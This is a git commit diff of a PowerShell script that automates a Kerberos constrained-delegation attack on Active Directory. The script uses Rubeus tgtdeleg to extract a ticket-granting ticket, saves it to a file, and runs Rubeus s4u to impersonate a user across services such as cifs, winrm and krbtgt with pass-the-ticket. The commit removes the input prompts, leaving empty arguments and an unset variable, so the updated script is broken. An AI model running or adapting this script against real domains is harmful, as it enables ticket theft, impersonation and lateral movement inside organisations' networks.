8469273ba898829ba95e27120b15417f368f6646
kyle <kyle41111@gmail.com>
2022-04-22 16:06:12 -0400

    Update ConstrainedDelegtgt.ps1

--- ActiveDirectory/ConstrainedDelegtgt.ps1
+++ ActiveDirectory/ConstrainedDelegtgt.ps1
@@ -1,10 +1,6 @@
 $out = (cmd /c Rubeus.exe tgtdeleg /nowrap) | Out-String
 $ticket = (print $out | select -last 2 | select -first 1).trim() 
 $ticket | Out-File kerb.txt
-$usr = Read-Host -Prompt 'User with Delegate perms plz'
-$impers = Read-Host -Prompt 'User to Impersonate plz'
-$msdsspn = Read-Host -Prompt 'msdsspn:'
-cmd /c Rubeus.exe s4u /user:$usr /impersonateuser:$impers /ticket:$ticket /msdsspn:"$msdsspn" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt
-$pc = Read-Host -Prompt 'Please enter Computer Name To Ps-Session to:'
-$sess = New-PSSession -ComputerName $pc
+cmd /c Rubeus.exe s4u /user:$usr /impersonateuser: /ticket:$ticket /msdsspn:"" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt
+
 
